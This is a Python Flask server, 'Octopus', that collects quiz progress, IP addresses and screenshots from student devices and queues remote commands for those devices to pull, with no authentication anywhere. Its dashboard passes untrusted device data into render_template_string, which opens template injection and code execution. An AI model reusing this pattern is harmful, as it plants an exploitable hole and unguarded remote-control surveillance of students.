from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import json
import os
import threading
import time
from datetime import datetime, timedelta
from collections import defaultdict

app = Flask(__name__)
# تفعيل CORS للسماح بالتحكم من أي مكان (أندرويد، متصفح، ملفات محلية)
CORS(app, resources={r"/*": {"origins": "*"}})

# زيادة حجم البيانات المسموح بها لاستلام الصور والبيانات الكبيرة
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB

# ملفات تخزين البيانات المؤقتة
DATA_FILE = '/tmp/octopus_data.json'
COMMANDS_FILE = '/tmp/octopus_cmds.json'

# مخازن البيانات في الذاكرة
students = defaultdict(dict)
pending_commands = defaultdict(list)

def load_data():
    """تحميل البيانات المحفوظة عند بدء التشغيل"""
    global students, pending_commands
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
                students.update(data)
        if os.path.exists(COMMANDS_FILE):
            with open(COMMANDS_FILE, 'r') as f:
                cmds = json.load(f)
                pending_commands.update(cmds)
    except Exception as e:
        print(f"📂 Load Error: {e}")

def save_data():
    """حفظ البيانات في الملفات لضمان عدم ضياعها"""
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(dict(students), f)
        with open(COMMANDS_FILE, 'w') as f:
            json.dump(dict(pending_commands), f)
    except Exception as e:
        print(f"💾 Save Error: {e}")

load_data()

def cleanup_loop():
    """تنظيف تلقائي للأجهزة غير النشطة منذ أكثر من 12 ساعة"""
    while True:
        now = datetime.utcnow()
        to_remove = []
        for sid, data in students.items():
            last = data.get('last_update')
            if last:
                try:
                    if (now - datetime.fromisoformat(last)) > timedelta(hours=12):
                        to_remove.append(sid)
                except: pass
        for sid in to_remove:
            del students[sid]
        time.sleep(3600)

threading.Thread(target=cleanup_loop, daemon=True).start()

# --- المسارات البرمجية ---

@app.route('/', methods=['GET', 'POST', 'OPTIONS'])
def track():
    """المسار الرئيسي لاستلام بيانات التتبع من الأجهزة"""
    if request.method == 'OPTIONS': return '', 204
    
    try:
        if request.is_json:
            data = request.json
        else:
            data = request.values.to_dict() or request.args.to_dict()

        if not data or 'device_id' not in data:
            return jsonify({"status": "error", "message": "no device_id"}), 400

        did = data['device_id']
        
        # تحديث بيانات الطالب في المخزن
        students[did].update(data)
        students[did]['last_update'] = datetime.utcnow().isoformat()
        students[did]['ip_address'] = request.remote_addr
        
        # معالجة خاصة لصور سكرين شوت
        if data.get('event') == 'screenshot_data':
            students[did]['last_screenshot'] = data.get('img')
            print(f"📸 Screenshot received from {did}")

        save_data()
        return jsonify({"status": "success", "device_id": did})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/get_commands', methods=['GET'])
def get_commands():
    """المسار الذي يتصل به ملف HTML لسحب الأوامر الجديدة"""
    did = request.args.get('device_id')
    if not did: return jsonify([])
    
    cmds = pending_commands.get(did, [])
    if cmds:
        pending_commands[did] = [] # مسح الأوامر بعد تسليمها
        save_data()
        print(f"📡 Device {did} pulled commands")
    
    return jsonify(cmds)

@app.route('/send_command', methods=['POST'])
def send_command():
    """المسار الذي تستخدمه لوحة التحكم لإرسال أمر لجهاز"""
    try:
        data = request.json
        did = data.get('device_id')
        if not did: return jsonify({"status": "error"}), 400
        
        pending_commands[did].append(data)
        save_data()
        return jsonify({"status": "queued", "device_id": did})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/students')
def api_students():
    """API يعيد قائمة الطلاب النشطين لتطبيق الادمن"""
    return jsonify(list(students.values()))

@app.route('/view')
def view_dashboard():
    """واجهة الويب الاحترافية Dashboard"""
    now = datetime.utcnow()
    rows = ""
    active_count = 0
    
    # ترتيب الأجهزة حسب آخر ظهور
    sorted_items = sorted(students.items(), key=lambda x: x[1].get('last_update', ''), reverse=True)

    for idx, (did, data) in enumerate(sorted_items, 1):
        last_up_str = data.get('last_update', now.isoformat())
        try:
            last_up = datetime.fromisoformat(last_up_str)
            diff = (now - last_up).total_seconds()
        except: diff = 9999

        is_active = diff < 60
        status_class = "status-active" if is_active else "status-inactive"
        status_text = "🟢 نشط" if is_active else "🔴 غير متصل"
        if is_active: active_count += 1
        
        rows += f"""
        <tr>
            <td>{idx}</td>
            <td><span class="device-id">{did}</span></td>
            <td>{data.get('quiz', 'غير معروف')}</td>
            <td>{data.get('answers_count', '0')}</td>
            <td>{data.get('time_left', '0')} ث</td>
            <td><span class="{status_class}">{status_text}</span></td>
            <td>{last_up.strftime('%H:%M:%S')}</td>
            <td>{data.get('ip_address', 'unknown')}</td>
        </tr>
        """

    html = f"""
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Octopus Control - Dashboard</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body {{ background: #0f172a; color: #f1f5f9; font-family: 'Segoe UI', sans-serif; }}
            .card {{ background: #1e293b; border: 1px solid #334155; border-radius: 15px; padding: 20px; }}
            h1 {{ color: #22c55e; font-weight: 800; }}
            th {{ color: #22c55e; border-bottom: 2px solid #334155 !important; }}
            .device-id {{ font-family: monospace; color: #38bdf8; background: #000; padding: 2px 6px; border-radius: 4px; }}
            .status-active {{ color: #22c55e; font-weight: bold; }}
            .status-inactive {{ color: #ef4444; font-weight: bold; }}
            .stat-box {{ background: #0f172a; border-radius: 10px; padding: 15px; text-align: center; border: 1px solid #334155; }}
            .stat-val {{ font-size: 1.8rem; font-weight: bold; color: #22c55e; }}
        </style>
        <script>setTimeout(() => location.reload(), 15000);</script>
    </head>
    <body>
        <div class="container py-5">
            <div class="card shadow-lg">
                <div class="d-flex justify-content-between align-items-center mb-4">
                    <h1>🐙 Octopus Server Monitor</h1>
                    <span class="badge bg-success p-2">LIVE SERVER</span>
                </div>
                
                <div class="row g-3 mb-4">
                    <div class="col-md-4"><div class="stat-box"><div class="stat-val">{len(students)}</div><div>إجمالي الطلاب</div></div></div>
                    <div class="col-md-4"><div class="stat-box"><div class="stat-val">{active_count}</div><div>نشط الآن</div></div></div>
                    <div class="col-md-4"><div class="stat-box"><div class="stat-val">{now.strftime('%H:%M:%S')}</div><div>آخر تحديث (UTC)</div></div></div>
                </div>

                <div class="table-responsive">
                    <table class="table table-dark table-hover align-middle">
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>معرف الجهاز</th>
                                <th>الامتحان</th>
                                <th>إجابات</th>
                                <th>المتبقي</th>
                                <th>الحالة</th>
                                <th>توقيت</th>
                                <th>IP</th>
                            </tr>
                        </thead>
                        <tbody>{rows}</tbody>
                    </table>
                </div>
            </div>
        </div>
    </body>
    </html>
    """
    return render_template_string(html)

if __name__ == '__main__':
    # التشغيل على بورت Railway
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
